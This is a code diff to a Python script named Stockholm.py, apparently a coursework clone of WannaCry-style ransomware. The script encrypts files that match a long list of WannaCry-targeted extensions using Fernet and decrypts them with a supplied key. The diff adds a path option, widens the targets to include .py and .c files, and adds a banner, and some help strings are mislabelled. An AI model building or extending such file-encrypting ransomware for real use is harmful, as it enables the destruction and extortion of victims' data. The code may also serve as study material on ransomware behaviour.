@@ -2,6 +2,7 @@ import os
 import sys
 import argparse
 import io
+import time
 import cryptography
 from cryptography.fernet import Fernet
 
@@ -9,6 +10,7 @@ from cryptography.fernet import Fernet
 # The encryption only must affect the files with the extensions which was been afected by WannaCry.
 # Without arguments, the program must encrypt the files.
 # '-r' or '--reverse' argument must decrypt the files with the key passed as argument.
+# '-p' or '--path' argument must change the path of the folder to encrypt/decrypt.
 # '-v' or '--version' argument must show the program version.
 # '-s' or '--silent' argument must not show anything in the console.
 # '-h' or '--help' argument must show the help message.
@@ -26,15 +28,23 @@ extensions_to_encrypt = ['.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem',
 					  '.dch', '.sch', '.brd', '.jsp', '.php', '.asp', '.java', '.jar', '.class',
 					  '.mp3', '.wav', '.swf', '.fla', '.wmv', '.mpg', '.vob', '.mpeg', '.asf', '.avi',
 					  '.mov', '.mp4', '.3gp', '.mkv', '.3g2', '.flv', '.wma', '.mid', '.m3u', '.m4u',
-					  '.djvu', '.svg', '.psd', '.nef', '.tiff', '.tif', '.cgm', '.raw', '.gif', '.png',
+					  '.djvu', '.svg', '.psd', '.nef', '.tiff', '.tif', '.cgm', '.raw', '.gif', '.py','.png',
 					  '.bmp', '.jpg', '.jpeg', '.vcd', '.iso', '.backup', '.zip', '.rar', '.tgz',
 					  '.tar', '.bak', '.tbk', '.bz2', '.PAQ', '.ARC', '.aes', '.gpg', '.vmx', '.vmdk',
 					  '.vdi', '.sldm', '.sldx', '.sti', '.sxi', '.602', '.hwp', '.snt', '.onetoc2',
-					  '.dwg', '.pdf', '.wk1', '.wks', '.123', '.rtf', '.csv', '.txt', '.vsdx', '.vsd',
+					  '.dwg', '.pdf', '.wk1', '.wks', '.123', '.rtf', '.csv', '.txt', '.vsdx', '.c', '.vsd',
 					  '.edb', '.eml', '.msg', '.ost', '.pst', '.potm', '.potx', '.ppam', '.ppsx',
 					  '.ppsm', '.pps', '.pot', '.pptm', '.pptx', '.ppt', '.xltm', '.xltx', '.xlc',
 					  '.xlm', '.xlt', '.xlw', '.xlsb', '.xlsm', '.xlsx', '.xls', '.dotx', '.dotm',
 					  '.dot', '.docm', '.docb', '.docx', '.doc']
+
+def message(path):
+    print(f"\033[92m")
+    with open("../../services/ascii-art2.txt", "r") as file_obj:
+        print(file_obj.read())
+        print(f"Stockholm.py encryption of \nPath: {path}\n")
+        time.sleep(3)
+    print("\033[0m")
 
 def encrypt(path, key):
     print("Encrypting files into a folder...🔑")
@@ -97,9 +107,9 @@ def main():
     
     # List of parse arguments
     parser = argparse.ArgumentParser(description='Encrypt/Decrypt files')
-    parser.add_argument('path', help='Path to encrypt/decrypt', action='store_true')
     parser.add_argument('-v', '--version', help='Show version', action='store_true')
     parser.add_argument('-r', '--reverse', metavar='clave', help='Reverse string')
+    parser.add_argument('-p', '--path', metavar='clave', help='Reverse string')
     parser.add_argument('-s', '--silent', help='Silent mode', action='store_true')
     args = parser.parse_args()
 
@@ -114,8 +124,16 @@ def main():
     elif args.reverse:
         print("Decrypting files...")
         decrypt(path, args.reverse)
+        if args.path:
+            print("Decrypting files...")
+            decrypt(args.path, args.reverse)
+    elif args.path:
+        print("Encrypting files...")
+        message(args.path)
+        encrypt(args.path, key)
     else:
         print("Encrypting files...")
+        message(path)
         encrypt(path, key)     
 
 if __name__ == '__main__':
